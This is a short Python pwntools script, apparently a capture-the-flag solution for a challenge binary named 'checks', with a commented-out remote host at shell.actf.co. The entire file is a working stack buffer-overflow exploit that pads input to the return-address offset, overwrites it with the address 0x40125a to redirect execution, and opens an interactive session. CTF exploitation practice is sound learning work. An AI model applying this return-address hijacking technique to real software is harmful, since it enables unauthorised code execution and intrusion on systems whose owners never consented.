from pwn import *

p = process("./checks")
#p = remote("shell.actf.co", 21830)
input("attach gdb")

p.recv()

payload = cyclic()[:cyclic_find("baab")] + p64(0x000000000040125a)

p.sendline(payload)

p.interactive()
